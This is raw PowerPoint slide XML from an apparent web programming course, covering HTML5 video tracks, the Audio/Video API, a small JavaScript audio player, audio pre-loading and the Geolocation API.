                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>" default&gt;&lt;/track&gt;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&lt;track kind="subtitles" label="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>suomalainen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tekstitys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>" src="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>subtitles_fi.vtt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srclang</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>="fi"&gt;&lt;/track&gt;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/video&gt;</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{36D7224A-188C-41A6-9122-2E3C1F20F66A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>HTML5 Audio and Video API</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6A3C44D6-65CA-4713-AFAE-08D925D72C5C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4924425"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Methods:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>canPlayType() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>checks if the browser can play the specified audio/video type</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>load() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>reloads the audio/video</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>play() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>starts playing the audio/video</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>pause() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>pauses the current audio/video</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Important properties:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>currentTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> = the current playback position in seconds</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>duration</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> = duration of audio/video in seconds</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>playbackRate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> = speed of the audio/video playback (1.0 = normal)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> = path to the file</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>volume</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> = set volume to audio/video (0.0 = silence, 1.0 = loudest)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Important events:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>oncanplaythrough</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> = fires when the browser can play the audio/video without buffering</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>oncanplay</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> = fires when the browser can start playing the audio/video</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>onended</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> = fires when the playback ends</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>onerror</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> = fires if something went wrong loading the audio/video</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>ontimeupdate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> = fires when the current playing position of the video has changed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="18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itle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FA90B96F-8127-4441-8CFC-3E8E225464D0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Audio Player in JS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165891" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{88073C4B-2DE6-46CE-AA26-9FEA20794ED2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="622300" y="1417638"/>
            <a:ext cx="10972800" cy="5440362"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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&lt;!DOCTYPE html&gt;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&lt;html&gt;&lt;head&gt;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&lt;meta charset="utf-8"&gt;&lt;title&gt;&lt;/title&gt;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&lt;script&gt;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>      var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>playMode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = true;</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function play() {</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if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>playMode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) {</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document.getElementById</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("music").play();</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document.getElementById</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play_button</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>").value = "Pause";</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 else {</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document.getElementById</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("music").pause();</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document.getElementById</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play_button</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>").value = "Play";</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playMode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = !</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>playMode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>; // reverse</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&lt;/script&gt;&lt;/head&gt;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&lt;body&gt;&lt;h1&gt;HTML5 Audio Example&lt;/h1&gt;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&lt;audio </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>="../assets/sloprano_swears.mp3" id="music"&gt;&lt;/audio&gt;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&lt;form&gt;&lt;input type="button" onclick="play()" id="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>play_button</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>" value="Play"        style="width:150px"&gt;&lt;/form&gt;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&lt;/body&gt;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&lt;/html&gt;</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itle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D322FEEE-A28B-4780-8EB9-0F2EF1C70BE9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Pre-loading Audio</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="166915" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B072B97C-866D-4114-BEAC-BD5A3FD5EBF4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="5068888"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>function loadAudio(id, src, callback) {</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let audio = document.createElement("audio");</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document.body.appendChild(audio);</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audio.setAttribute("id", id);</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audio.setAttribute("preload", "auto");</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audio.setAttribute("src", src);</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audio.addEventListener('canplaythrough', callback);</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return audio;</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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>sounds.shoot = loadAudio("shoot", "shotgun.wav", assetLoaded);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>function assetLoaded() {</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if (++loadCounter &lt; NUMBER_OF_ASSETS) return;</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for (let sound of Object.values(sounds)) {</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sound.removeEventListener('canplaythrough', assetLoaded);</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  }</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6A475075-688E-43AB-AFB2-1279A6A463FF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Geolocation API</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="167939" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F9862702-8F89-4765-88A3-7209BB7502FF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>navigator.geolocation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> has only 3 methods:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>getCurrentPosition(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1" i="1"/>
              <a:t>successHandler, errorHandler, options</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>watchPosition(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1" i="1"/>
              <a:t>successHandler, errorHandler, options</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>returns </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>watchId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>, which can be used with clearWatch, calls successHandler everytime position is updated</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" b="1"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>clearWatch(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1" i="1"/>
              <a:t>watchId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> cancels ongoing watchPosition call</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0D9DA195-0222-4556-B23C-04AB0ADB401A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Geolocation Position Object</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Sisällön paikkamerkki 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4E6B0F11-EF3E-41BB-934D-D4EE2D037673}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1981200" y="1600200"/>
          <a:ext cx="8229600" cy="3606800"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="2530624">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20000"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="5698976">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20001"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0"/>
                        <a:t>position properties</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0"/>
                        <a:t>Explanation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err="1"/>
                        <a:t>coords.latitude</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" noProof="0" dirty="0"/>
                    </a:p>
                    <a:p>
                      <a:endParaRPr lang="en-US" noProof="0" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
